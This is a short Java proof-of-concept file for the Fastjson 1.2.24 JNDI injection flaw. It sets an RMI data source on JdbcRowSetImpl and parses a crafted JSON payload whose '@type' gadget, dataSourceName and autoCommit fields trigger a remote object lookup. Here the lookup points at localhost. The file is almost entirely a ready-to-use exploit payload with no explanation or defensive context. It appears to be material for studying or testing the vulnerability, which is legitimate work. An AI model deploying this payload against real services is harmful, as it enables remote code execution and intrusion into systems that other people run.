import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;

public class JNDIPoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] Test JdbcRowSetImpl.setDataSourceName");
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String dataSource = "rmi://localhost:1099/remoteObj";
        jdbcRowSet.setDataSourceName(dataSource);
        System.out.println("[+] Test FastJson 1.2.24 JNDI PoC");
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";
        JSON.parse(payload);

    }
}
